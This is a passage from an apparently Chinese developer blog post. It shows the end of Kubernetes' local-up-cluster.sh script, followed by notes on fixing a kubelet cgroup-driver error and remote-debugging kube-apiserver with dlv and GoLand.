mkdir -p "$&#123;POD_MANIFEST_PATH&#125;"</span><br><span class="line">    priv_arg=""</span><br><span class="line">    if [[ -n "$&#123;ALLOW_PRIVILEGED&#125;" ]]; then</span><br><span class="line">      priv_arg="--allow-privileged "</span><br><span class="line">    fi</span><br><span class="line">    cloud_config_arg="--cloud-provider=$&#123;CLOUD_PROVIDER&#125; --cloud-config=$&#123;CLOUD_CONFIG&#125;"</span><br><span class="line">    if [[ "$&#123;EXTERNAL_CLOUD_PROVIDER:-&#125;" == "true" ]]; then</span><br><span class="line">       cloud_config_arg="--cloud-provider=external"</span><br><span class="line">       cloud_config_arg+=" --provider-id=$(hostname)"</span><br><span class="line">    fi</span><br><span class="line">    mkdir -p "/var/lib/kubelet" &amp;&gt;/dev/null || sudo mkdir -p "/var/lib/kubelet"</span><br><span class="line">    if [[ -z "$&#123;DOCKERIZE_KUBELET&#125;" ]]; then</span><br><span class="line">      # Enable dns</span><br><span class="line">      if [[ "$&#123;ENABLE_CLUSTER_DNS&#125;" = true ]]; then</span><br><span class="line">         dns_args="--cluster-dns=$&#123;DNS_SERVER_IP&#125; --cluster-domain=$&#123;DNS_DOMAIN&#125;"</span><br><span class="line">      else</span><br><span class="line">         # To start a private DNS server set ENABLE_CLUSTER_DNS and</span><br><span class="line">         # DNS_SERVER_IP/DOMAIN. This will at least provide a working</span><br><span class="line">         # DNS server for real world hostnames.</span><br><span class="line">         dns_args="--cluster-dns=8.8.8.8"</span><br><span class="line">      fi</span><br><span class="line">      net_plugin_args=""</span><br><span class="line">      if [[ -n "$&#123;NET_PLUGIN&#125;" ]]; then</span><br><span class="line">        net_plugin_args="--network-plugin=$&#123;NET_PLUGIN&#125;"</span><br><span class="line">      fi</span><br><span class="line">      auth_args=""</span><br><span class="line">      if [[ -n "$&#123;KUBELET_AUTHORIZATION_WEBHOOK:-&#125;" ]]; then</span><br><span class="line">        auth_args="$&#123;auth_args&#125; --authorization-mode=Webhook"</span><br><span class="line">      fi</span><br><span class="line">      if [[ -n "$&#123;KUBELET_AUTHENTICATION_WEBHOOK:-&#125;" ]]; then</span><br><span class="line">        auth_args="$&#123;auth_args&#125; --authentication-token-webhook"</span><br><span class="line">      fi</span><br><span class="line">      if [[ -n "$&#123;CLIENT_CA_FILE:-&#125;" ]]; then</span><br><span class="line">        auth_args="$&#123;auth_args&#125; --client-ca-file=$&#123;CLIENT_CA_FILE&#125;"</span><br><span class="line">      fi</span><br><span class="line">      cni_conf_dir_args=""</span><br><span class="line">      if [[ -n "$&#123;CNI_CONF_DIR&#125;" ]]; then</span><br><span class="line">        cni_conf_dir_args="--cni-conf-dir=$&#123;CNI_CONF_DIR&#125;"</span><br><span class="line">      fi</span><br><span class="line">      cni_bin_dir_args=""</span><br><span class="line">      if [[ -n "$&#123;CNI_BIN_DIR&#125;" ]]; then</span><br><span class="line">        cni_bin_dir_args="--cni-bin-dir=$&#123;CNI_BIN_DIR&#125;"</span><br><span class="line">      fi</span><br><span class="line">      container_runtime_endpoint_args=""</span><br><span class="line">      if [[ -n "$&#123;CONTAINER_RUNTIME_ENDPOINT&#125;" ]]; then</span><br><span class="line">        container_runtime_endpoint_args="--container-runtime-endpoint=$&#123;CONTAINER_RUNTIME_ENDPOINT&#125;"</span><br><span class="line">      fi</span><br><span class="line">      image_service_endpoint_args=""</span><br><span class="line">      if [[ -n "$&#123;IMAGE_SERVICE_ENDPOINT&#125;" ]]; then</span><br><span class="line">        image_service_endpoint_args="--image-service-endpoint=$&#123;IMAGE_SERVICE_ENDPOINT&#125;"</span><br><span class="line">      fi</span><br><span class="line">      #sudo -E "$&#123;GO_OUT&#125;/hyperkube" kubelet $&#123;priv_arg&#125;\</span><br><span class="line">      sudo -E "$&#123;GO_OUT&#125;/kubelet" $&#123;priv_arg&#125;\</span><br><span class="line">        --v=$&#123;LOG_LEVEL&#125; \</span><br><span class="line">        --vmodule="$&#123;LOG_SPEC&#125;" \</span><br><span class="line">        --chaos-chance="$&#123;CHAOS_CHANCE&#125;" \</span><br><span class="line">        --container-runtime="$&#123;CONTAINER_RUNTIME&#125;" \</span><br><span class="line">--fail-swap-on=false \</span><br><span class="line">        #--rkt-path="$&#123;RKT_PATH&#125;" \</span><br><span class="line">        --rkt-stage1-image="$&#123;RKT_STAGE1_IMAGE&#125;" \</span><br><span class="line">        --hostname-override="$&#123;HOSTNAME_OVERRIDE&#125;" \</span><br><span class="line">        $&#123;cloud_config_arg&#125; \</span><br><span class="line">        --address="$&#123;KUBELET_HOST&#125;" \</span><br><span class="line">        --kubeconfig "$CERT_DIR"/kubelet.kubeconfig \</span><br><span class="line">        --feature-gates="$&#123;FEATURE_GATES&#125;" \</span><br><span class="line">        --cpu-cfs-quota=$&#123;CPU_CFS_QUOTA&#125; \</span><br><span class="line">        --enable-controller-attach-detach="$&#123;ENABLE_CONTROLLER_ATTACH_DETACH&#125;" \</span><br><span class="line">        --cgroups-per-qos=$&#123;CGROUPS_PER_QOS&#125; \</span><br><span class="line">        --cgroup-driver=$&#123;CGROUP_DRIVER&#125; \</span><br><span class="line">        --keep-terminated-pod-volumes=$&#123;KEEP_TERMINATED_POD_VOLUMES&#125; \</span><br><span class="line">        --eviction-hard=$&#123;EVICTION_HARD&#125; \</span><br><span class="line">        --eviction-soft=$&#123;EVICTION_SOFT&#125; \</span><br><span class="line">        --eviction-pressure-transition-period=$&#123;EVICTION_PRESSURE_TRANSITION_PERIOD&#125; \</span><br><span class="line">        --pod-manifest-path="$&#123;POD_MANIFEST_PATH&#125;" \</span><br><span class="line">        --fail-swap-on="$&#123;FAIL_SWAP_ON&#125;" \</span><br><span class="line">        $&#123;auth_args&#125; \</span><br><span class="line">        $&#123;dns_args&#125; \</span><br><span class="line">        $&#123;cni_conf_dir_args&#125; \</span><br><span class="line">        $&#123;cni_bin_dir_args&#125; \</span><br><span class="line">        $&#123;net_plugin_args&#125; \</span><br><span class="line">        $&#123;container_runtime_endpoint_args&#125; \</span><br><span class="line">        $&#123;image_service_endpoint_args&#125; \</span><br><span class="line">        --port="$KUBELET_PORT" \</span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;KUBELET_FLAGS&#125; &gt;<span class="string">"<span class="variable">$&#123;KUBELET_LOG&#125;</span>"</span> 2&gt;&amp;1 &amp;</span></span><br><span class="line">      KUBELET_PID=$!</span><br><span class="line">      # Quick check that kubelet is running.</span><br><span class="line">      if ps -p $KUBELET_PID &gt; /dev/null ; then</span><br><span class="line">echo "kubelet ( $KUBELET_PID ) is running."</span><br><span class="line">      else</span><br><span class="line">cat $&#123;KUBELET_LOG&#125; ; exit 1</span><br><span class="line">      fi</span><br><span class="line">    else</span><br><span class="line">      # Docker won't run a container with a cidfile (container id file)</span><br><span class="line">      # unless that file does not already exist; clean up an existing</span><br><span class="line">      # dockerized kubelet that might be running.</span><br><span class="line">      cleanup_dockerized_kubelet</span><br><span class="line">      cred_bind=""</span><br><span class="line">      # path to cloud credentials.</span><br><span class="line">      cloud_cred=""</span><br><span class="line">      if [ "$&#123;CLOUD_PROVIDER&#125;" == "aws" ]; then</span><br><span class="line">          cloud_cred="$&#123;HOME&#125;/.aws/credentials"</span><br><span class="line">      fi</span><br><span class="line">      if [ "$&#123;CLOUD_PROVIDER&#125;" == "gce" ]; then</span><br><span class="line">          cloud_cred="$&#123;HOME&#125;/.config/gcloud"</span><br><span class="line">      fi</span><br><span class="line">      if [ "$&#123;CLOUD_PROVIDER&#125;" == "openstack" ]; then</span><br><span class="line">          cloud_cred="$&#123;CLOUD_CONFIG&#125;"</span><br><span class="line">      fi</span><br><span class="line">      if  [[ -n "$&#123;cloud_cred&#125;" ]]; then</span><br><span class="line">          cred_bind="--volume=$&#123;cloud_cred&#125;:$&#123;cloud_cred&#125;:ro"</span><br><span class="line">      fi</span><br><span class="line">      docker run \</span><br><span class="line">        --volume=/:/rootfs:ro \</span><br><span class="line">        --volume=/var/run:/var/run:rw \</span><br><span class="line">        --volume=/sys:/sys:ro \</span><br><span class="line">        --volume=/var/lib/docker/:/var/lib/docker:ro \</span><br><span class="line">        --volume=/var/lib/kubelet/:/var/lib/kubelet:rw \</span><br><span class="line">        --volume=/dev:/dev \</span><br><span class="line">        --volume=/run/xtables.lock:/run/xtables.lock:rw \</span><br><span class="line">        $&#123;cred_bind&#125; \</span><br><span class="line">        --net=host \</span><br><span class="line">        --privileged=true \</span><br><span class="line">        -i \</span><br><span class="line">        --cidfile=$KUBELET_CIDFILE \</span><br><span class="line">        k8s.gcr.io/kubelet \</span><br><span class="line">        /kubelet --v=$&#123;LOG_LEVEL&#125; --containerized $&#123;priv_arg&#125;--chaos-chance="$&#123;CHAOS_CHANCE&#125;" --pod-manifest-path="$&#123;POD_MANIFEST_PATH&#125;" --hostname-override="$&#123;HOSTNAME_OVERRIDE&#125;" $&#123;cloud_config_arg&#125; \ --address="127.0.0.1" --kubeconfig "$CERT_DIR"/kubelet.kubeconfig --port="$KUBELET_PORT"  --enable-controller-attach-detach="$&#123;ENABLE_CONTROLLER_ATTACH_DETACH&#125;" &amp;&gt; $KUBELET_LOG &amp;</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br><span class="line">function start_kubeproxy &#123;</span><br><span class="line">    PROXY_LOG=$&#123;LOG_DIR&#125;/kube-proxy.log</span><br><span class="line">    cat &lt;&lt;EOF &gt; /tmp/kube-proxy.yaml</span><br><span class="line">apiVersion: kubeproxy.config.k8s.io/v1alpha1</span><br><span class="line">kind: KubeProxyConfiguration</span><br><span class="line">clientConnection:</span><br><span class="line">  kubeconfig: $&#123;CERT_DIR&#125;/kube-proxy.kubeconfig</span><br><span class="line">hostnameOverride: $&#123;HOSTNAME_OVERRIDE&#125;</span><br><span class="line">mode: $&#123;KUBE_PROXY_MODE&#125;</span><br><span class="line">EOF</span><br><span class="line">    #sudo "$&#123;GO_OUT&#125;/hyperkube" proxy \</span><br><span class="line">    sudo "$&#123;GO_OUT&#125;/kube-proxy" \</span><br><span class="line">      --v=$&#123;LOG_LEVEL&#125; \</span><br><span class="line">      --feature-gates="$&#123;FEATURE_GATES&#125;" \</span><br><span class="line">      --config=/tmp/kube-proxy.yaml \</span><br><span class="line">      --master="https://$&#123;API_HOST&#125;:$&#123;API_SECURE_PORT&#125;" &gt;"$&#123;PROXY_LOG&#125;" 2&gt;&amp;1 &amp;</span><br><span class="line">    PROXY_PID=$!</span><br><span class="line">    SCHEDULER_LOG=$&#123;LOG_DIR&#125;/kube-scheduler.log</span><br><span class="line">    #$&#123;CONTROLPLANE_SUDO&#125; "$&#123;GO_OUT&#125;/hyperkube" scheduler \</span><br><span class="line">    $&#123;CONTROLPLANE_SUDO&#125; "$&#123;GO_OUT&#125;/kube-scheduler" \</span><br><span class="line">      --v=$&#123;LOG_LEVEL&#125; \</span><br><span class="line">      --kubeconfig "$CERT_DIR"/scheduler.kubeconfig \</span><br><span class="line">      --feature-gates="$&#123;FEATURE_GATES&#125;" \</span><br><span class="line">      --master="https://$&#123;API_HOST&#125;:$&#123;API_SECURE_PORT&#125;" &gt;"$&#123;SCHEDULER_LOG&#125;" 2&gt;&amp;1 &amp;</span><br><span class="line">    SCHEDULER_PID=$!</span><br><span class="line">&#125;</span><br><span class="line">function start_kubedns &#123;</span><br><span class="line">    if [[ "$&#123;ENABLE_CLUSTER_DNS&#125;" = true ]]; then</span><br><span class="line">        cp "$&#123;KUBE_ROOT&#125;/cluster/addons/dns/kube-dns.yaml.in" kube-dns.yaml</span><br><span class="line">        sed -i -e "s/&#123;&#123; pillar\['dns_domain'\] &#125;&#125;/$&#123;DNS_DOMAIN&#125;/g" kube-dns.yaml</span><br><span class="line">        sed -i -e "s/&#123;&#123; pillar\['dns_server'\] &#125;&#125;/$&#123;DNS_SERVER_IP&#125;/g" kube-dns.yaml</span><br><span class="line">        # TODO update to dns role once we have one.</span><br><span class="line">        # use kubectl to create kubedns addon</span><br><span class="line">        $&#123;KUBECTL&#125; --kubeconfig="$&#123;CERT_DIR&#125;/admin.kubeconfig" --namespace=kube-system create -f kube-dns.yaml</span><br><span class="line">        echo "Kube-dns addon successfully deployed."</span><br><span class="line">        rm kube-dns.yaml</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br><span class="line">function start_kubedashboard &#123;</span><br><span class="line">    if [[ "$&#123;ENABLE_CLUSTER_DASHBOARD&#125;" = true ]]; then</span><br><span class="line">        echo "Creating kubernetes-dashboard"</span><br><span class="line">        # use kubectl to create the dashboard</span><br><span class="line">        $&#123;KUBECTL&#125; --kubeconfig="$&#123;CERT_DIR&#125;/admin.kubeconfig" apply -f $&#123;KUBE_ROOT&#125;/cluster/addons/dashboard/dashboard-secret.yaml</span><br><span class="line">        $&#123;KUBECTL&#125; --kubeconfig="$&#123;CERT_DIR&#125;/admin.kubeconfig" apply -f $&#123;KUBE_ROOT&#125;/cluster/addons/dashboard/dashboard-configmap.yaml</span><br><span class="line">        $&#123;KUBECTL&#125; --kubeconfig="$&#123;CERT_DIR&#125;/admin.kubeconfig" apply -f $&#123;KUBE_ROOT&#125;/cluster/addons/dashboard/dashboard-rbac.yaml</span><br><span class="line">        $&#123;KUBECTL&#125; --kubeconfig="$&#123;CERT_DIR&#125;/admin.kubeconfig" apply -f $&#123;KUBE_ROOT&#125;/cluster/addons/dashboard/dashboard-controller.yaml</span><br><span class="line">        $&#123;KUBECTL&#125; --kubeconfig="$&#123;CERT_DIR&#125;/admin.kubeconfig" apply -f $&#123;KUBE_ROOT&#125;/cluster/addons/dashboard/dashboard-service.yaml</span><br><span class="line">        echo "kubernetes-dashboard deployment and service successfully deployed."</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br><span class="line">function create_psp_policy &#123;</span><br><span class="line">    echo "Create podsecuritypolicy policies for RBAC."</span><br><span class="line">    $&#123;KUBECTL&#125; --kubeconfig="$&#123;CERT_DIR&#125;/admin.kubeconfig" create -f $&#123;KUBE_ROOT&#125;/examples/podsecuritypolicy/rbac/policies.yaml</span><br><span class="line">    $&#123;KUBECTL&#125; --kubeconfig="$&#123;CERT_DIR&#125;/admin.kubeconfig" create -f $&#123;KUBE_ROOT&#125;/examples/podsecuritypolicy/rbac/roles.yaml</span><br><span class="line">    $&#123;KUBECTL&#125; --kubeconfig="$&#123;CERT_DIR&#125;/admin.kubeconfig" create -f $&#123;KUBE_ROOT&#125;/examples/podsecuritypolicy/rbac/bindings.yaml</span><br><span class="line">&#125;</span><br><span class="line">function create_storage_class &#123;</span><br><span class="line">    if [ -z "$CLOUD_PROVIDER" ]; then</span><br><span class="line">        CLASS_FILE=$&#123;KUBE_ROOT&#125;/cluster/addons/storage-class/local/default.yaml</span><br><span class="line">    else</span><br><span class="line">        CLASS_FILE=$&#123;KUBE_ROOT&#125;/cluster/addons/storage-class/$&#123;CLOUD_PROVIDER&#125;/default.yaml</span><br><span class="line">    fi</span><br><span class="line">    if [ -e $CLASS_FILE ]; then</span><br><span class="line">        echo "Create default storage class for $CLOUD_PROVIDER"</span><br><span class="line">        $&#123;KUBECTL&#125; --kubeconfig="$&#123;CERT_DIR&#125;/admin.kubeconfig" create -f $CLASS_FILE</span><br><span class="line">    else</span><br><span class="line">        echo "No storage class available for $CLOUD_PROVIDER."</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br><span class="line">function print_success &#123;</span><br><span class="line">if [[ "$&#123;START_MODE&#125;" != "kubeletonly" ]]; then</span><br><span class="line">  if [[ "$&#123;ENABLE_DAEMON&#125;" = false ]]; then</span><br><span class="line">    echo "Local Kubernetes cluster is running. Press Ctrl-C to shut it down."</span><br><span class="line">  else</span><br><span class="line">    echo "Local Kubernetes cluster is running."</span><br><span class="line">  fi</span><br><span class="line">  cat &lt;&lt;EOF</span><br><span class="line">Logs:</span><br><span class="line"><span class="meta">  $</span><span class="bash">&#123;APISERVER_LOG:-&#125;</span></span><br><span class="line"><span class="meta">  $</span><span class="bash">&#123;CTLRMGR_LOG:-&#125;</span></span><br><span class="line"><span class="meta">  $</span><span class="bash">&#123;CLOUD_CTLRMGR_LOG:-&#125;</span></span><br><span class="line"><span class="meta">  $</span><span class="bash">&#123;PROXY_LOG:-&#125;</span></span><br><span class="line"><span class="meta">  $</span><span class="bash">&#123;SCHEDULER_LOG:-&#125;</span></span><br><span class="line">EOF</span><br><span class="line">fi</span><br><span class="line">if [[ "$&#123;ENABLE_APISERVER_BASIC_AUDIT:-&#125;" = true ]]; then</span><br><span class="line">  echo "  $&#123;APISERVER_BASIC_AUDIT_LOG&#125;"</span><br><span class="line">fi</span><br><span class="line">if [[ "$&#123;START_MODE&#125;" == "all" ]]; then</span><br><span class="line">  echo "  $&#123;KUBELET_LOG&#125;"</span><br><span class="line">elif [[ "$&#123;START_MODE&#125;" == "nokubelet" ]]; then</span><br><span class="line">  echo</span><br><span class="line">  echo "No kubelet was started because you set START_MODE=nokubelet"</span><br><span class="line">  echo "Run this script again with START_MODE=kubeletonly to run a kubelet"</span><br><span class="line">fi</span><br><span class="line">if [[ "$&#123;START_MODE&#125;" != "kubeletonly" ]]; then</span><br><span class="line">  echo</span><br><span class="line">  if [[ "$&#123;ENABLE_DAEMON&#125;" = false ]]; then</span><br><span class="line">    echo "To start using your cluster, you can open up another terminal/tab and run:"</span><br><span class="line">  else</span><br><span class="line">    echo "To start using your cluster, run:"</span><br><span class="line">  fi</span><br><span class="line">  cat &lt;&lt;EOF</span><br><span class="line">  export KUBECONFIG=$&#123;CERT_DIR&#125;/admin.kubeconfig</span><br><span class="line">  cluster/kubectl.sh</span><br><span class="line">Alternatively, you can write to the default kubeconfig:</span><br><span class="line">  export KUBERNETES_PROVIDER=local</span><br><span class="line">  cluster/kubectl.sh config set-cluster local --server=https://$&#123;API_HOST&#125;:$&#123;API_SECURE_PORT&#125; --certificate-authority=$&#123;ROOT_CA_FILE&#125;</span><br><span class="line">  cluster/kubectl.sh config set-credentials myself $&#123;AUTH_ARGS&#125;</span><br><span class="line">  cluster/kubectl.sh config set-context local --cluster=local --user=myself</span><br><span class="line">  cluster/kubectl.sh config use-context local</span><br><span class="line">  cluster/kubectl.sh</span><br><span class="line">EOF</span><br><span class="line">else</span><br><span class="line">  cat &lt;&lt;EOF</span><br><span class="line">The kubelet was started.</span><br><span class="line">Logs:</span><br><span class="line"><span class="meta">  $</span><span class="bash">&#123;KUBELET_LOG&#125;</span></span><br><span class="line">EOF</span><br><span class="line">fi</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> If we are running <span class="keyword">in</span> the CI, we need a few more things before we can start</span></span><br><span class="line">if [[ "$&#123;KUBETEST_IN_DOCKER:-&#125;" == "true" ]]; then</span><br><span class="line">  echo "Preparing to test ..."</span><br><span class="line"><span class="meta">  $</span><span class="bash">&#123;KUBE_ROOT&#125;/hack/install-etcd.sh</span></span><br><span class="line">  export PATH="$&#123;KUBE_ROOT&#125;/third_party/etcd:$&#123;PATH&#125;"</span><br><span class="line">  KUBE_FASTBUILD=true make ginkgo cross</span><br><span class="line">  apt install -y sudo</span><br><span class="line">fi</span><br><span class="line"><span class="meta">#</span><span class="bash"> validate that etcd is: not running, <span class="keyword">in</span> path, and has minimum required version.</span></span><br><span class="line">if [[ "$&#123;START_MODE&#125;" != "kubeletonly" ]]; then</span><br><span class="line">  kube::etcd::validate</span><br><span class="line">fi</span><br><span class="line">if [ "$&#123;CONTAINER_RUNTIME&#125;" == "docker" ] &amp;&amp; ! kube::util::ensure_docker_daemon_connectivity; then</span><br><span class="line">  exit 1</span><br><span class="line">fi</span><br><span class="line">if [[ "$&#123;CONTAINER_RUNTIME&#125;" == "rkt" ]]; then</span><br><span class="line">  test_rkt</span><br><span class="line">fi</span><br><span class="line">if [[ "$&#123;START_MODE&#125;" != "kubeletonly" ]]; then</span><br><span class="line">  test_apiserver_off</span><br><span class="line">fi</span><br><span class="line">kube::util::test_openssl_installed</span><br><span class="line">kube::util::ensure-cfssl</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## IF the user didn't supply an output/ for the build... Then we detect.</span></span></span><br><span class="line">if [ "$GO_OUT" == "" ]; then</span><br><span class="line">  detect_binary</span><br><span class="line">fi</span><br><span class="line">echo "Detected host and ready to start services.  Doing some housekeeping first..."</span><br><span class="line">echo "Using GO_OUT $GO_OUT"</span><br><span class="line">KUBELET_CIDFILE=/tmp/kubelet.cid</span><br><span class="line">if [[ "$&#123;ENABLE_DAEMON&#125;" = false ]]; then</span><br><span class="line">  trap cleanup EXIT</span><br><span class="line">fi</span><br><span class="line">echo "Starting services now!"</span><br><span class="line">if [[ "$&#123;START_MODE&#125;" != "kubeletonly" ]]; then</span><br><span class="line">  start_etcd</span><br><span class="line">  set_service_accounts</span><br><span class="line">  start_apiserver</span><br><span class="line">  start_controller_manager</span><br><span class="line">  if [[ "$&#123;EXTERNAL_CLOUD_PROVIDER:-&#125;" == "true" ]]; then</span><br><span class="line">    start_cloud_controller_manager</span><br><span class="line">  fi</span><br><span class="line">  start_kubeproxy</span><br><span class="line">  start_kubedns</span><br><span class="line">  start_kubedashboard</span><br><span class="line">fi</span><br><span class="line">if [[ "$&#123;START_MODE&#125;" != "nokubelet" ]]; then</span><br><span class="line"><span class="meta">  #</span><span class="bash"><span class="comment"># TODO remove this check if/when kubelet is supported on darwin</span></span></span><br><span class="line"><span class="meta">  #</span><span class="bash"> Detect the OS name/arch and display appropriate error.</span></span><br><span class="line">    case "$(uname -s)" in</span><br><span class="line">      Darwin)</span><br><span class="line">        warning "kubelet is not currently supported in darwin, kubelet aborted."</span><br><span class="line">        KUBELET_LOG=""</span><br><span class="line">        ;;</span><br><span class="line">      Linux)</span><br><span class="line">        start_kubelet</span><br><span class="line">        ;;</span><br><span class="line">      *)</span><br><span class="line">        warning "Unsupported host OS.  Must be Linux or Mac OS X, kubelet aborted."</span><br><span class="line">        ;;</span><br><span class="line">    esac</span><br><span class="line">fi</span><br><span class="line">if [[ -n "$&#123;PSP_ADMISSION&#125;" &amp;&amp; "$&#123;AUTHORIZATION_MODE&#125;" = *RBAC* ]]; then</span><br><span class="line">  create_psp_policy</span><br><span class="line">fi</span><br><span class="line">if [[ "$DEFAULT_STORAGE_CLASS" = "true" ]]; then</span><br><span class="line">  create_storage_class</span><br><span class="line">fi</span><br><span class="line">print_success</span><br><span class="line">if [[ "$&#123;ENABLE_DAEMON&#125;" = false ]]; then</span><br><span class="line">  while true; do sleep 1; done</span><br><span class="line">fi</span><br><span class="line">if [[ "$&#123;KUBETEST_IN_DOCKER:-&#125;" == "true" ]]; then</span><br><span class="line">  cluster/kubectl.sh config set-cluster local --server=https://localhost:6443 --certificate-authority=/var/run/kubernetes/server-ca.crt</span><br><span class="line">  cluster/kubectl.sh config set-credentials myself --client-key=/var/run/kubernetes/client-admin.key --client-certificate=/var/run/kubernetes/client-admin.crt</span><br><span class="line">  cluster/kubectl.sh config set-context local --cluster=local --user=myself</span><br><span class="line">  cluster/kubectl.sh config use-context local</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>执行过程中如果有kubelet启动失败的问题；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">failed to run Kubelet: failed to create kubelet: misconfiguration: kubelet c</span><br></pre></td></tr></table></figure><p>解决方案:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@server02 ~]# docker info</span><br><span class="line">...</span><br><span class="line">Server Version: 1.13.1</span><br><span class="line">Storage Driver: overlay2</span><br><span class="line"> Backing Filesystem: xfs</span><br><span class="line"> Supports d_type: true</span><br><span class="line"> Native Overlay Diff: true</span><br><span class="line">Logging Driver: journald</span><br><span class="line">Cgroup Driver: systemd</span><br><span class="line">...</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 修改docker.service</span></span><br><span class="line">vi /lib/systemd/system/docker.service</span><br><span class="line"></span><br><span class="line">找到</span><br><span class="line">--exec-opt native.cgroupdriver=systemd \</span><br><span class="line">修改为：</span><br><span class="line">--exec-opt native.cgroupdriver=cgroupfs \</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 重启docker</span></span><br><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改后查看docker Cgroup Driver</span></span><br><span class="line">[root@server03 sysconfig]# docker info</span><br><span class="line">...</span><br><span class="line">Server Version: 1.13.1</span><br><span class="line">Storage Driver: overlay2</span><br><span class="line"> Backing Filesystem: xfs</span><br><span class="line"> Supports d_type: true</span><br><span class="line"> Native Overlay Diff: true</span><br><span class="line">Logging Driver: journald</span><br><span class="line">Cgroup Driver: cgroupfs</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>继续：</p><p>单机集群：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">第一次执行下面的命令编译并启动集群</span></span><br><span class="line">./hack/local-up-cluster.sh</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make GOGCFLAGS="-N -l" WHAT="cmd/kube-apiserver" # 假设只编译kube-apiserver这一个模块，需要单独编译，这个命令不管用，不考虑了吧~~</span><br></pre></td></tr></table></figure><p>直接执行跳过编译：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hack/local-up-cluster.sh -O</span><br></pre></td></tr></table></figure><p>检查kube启动正常</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef|grep kube|grep -v grep</span><br></pre></td></tr></table></figure><p>以apiserver为例子</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kill -15 5228</span><br><span class="line">dlv --listen=:2345 --headless=true --api-version=2 --accept-multiclient exec /root/gopath/src/k8s.io/kubernetes/_output/bin/kube-apiserver -- --authorization-mode=Node,RBAC --runtime-config=settings.k8s.io/v1alpha1 --cloud-provider= --cloud-config= --v=3 --vmodule= --cert-dir=/var/run/kubernetes --client-ca-file=/var/run/kubernetes/client-ca.crt --service-account-key-file=/tmp/kube-serviceaccount.key --service-account-lookup=true --enable-admission-plugins=LimitRanger,ServiceAccount,DefaultStorageClass,DefaultTolerationSeconds,MutatingAdmissionWebhook,ValidatingAdmissionWebhook,ResourceQuota,PodPreset,StorageObjectInUseProtection --disable-admission-plugins= --admission-control-config-file= --bind-address=0.0.0.0 --secure-port=6443 --tls-cert-file=/var/run/kubernetes/serving-kube-apiserver.crt --tls-private-key-file=/var/run/kubernetes/serving-kube-apiserver.key --insecure-bind-address=127.0.0.1 --insecure-port=8080 --storage-backend=etcd3 --etcd-servers=http://127.0.0.1:2379 --service-cluster-ip-range=10.0.0.0/24 --feature-gates=AllAlpha=false --external-hostname=localhost --requestheader-username-headers=X-Remote-User --requestheader-group-headers=X-Remote-Group --requestheader-extra-headers-prefix=X-Remote-Extra- --requestheader-client-ca-file=/var/run/kubernetes/request-header-ca.crt --requestheader-allowed-names=system:auth-proxy --proxy-client-cert-file=/var/run/kubernetes/client-auth-proxy.crt --proxy-client-key-file=/var/run/kubernetes/client-auth-proxy.key --cors-allowed-origins='/127.0.0.1(:[0-9]+)?$,/localhost(:[0-9]+)?$'</span><br></pre></td></tr></table></figure><p>执行apiserver</p><p>远程端口：39999</p><p> 防火墙放开：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=39999/tcp --permanent</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure><p>远程调试坑：</p><p>如果要调试如kube-apiserver程序则需要重新编译增加编译参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go build -o _output/bin/kube-apiserver -gcflags="-N -l" cmd/kube-apiserver/apiserver.go</span><br></pre></td></tr></table></figure><p>否则无法监听</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export GO_OUT=/<span class="keyword">go</span>/src/k8s.io/kubernetes/_output/bin</span><br></pre></td></tr></table></figure><p>goland配置：</p><p>Run-&gt;edit configuration配置。</p><p><img src="C:%5CUsers%5Cxudong%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1567673734423.png" alt="1567673734423"></p><p>断点调试。</p><p>这样远程同步完代码就可以远程调试了。</p><p>开始源码分析之路~~。</p>]]></content>
    
    <summary type="html">
    
      
      
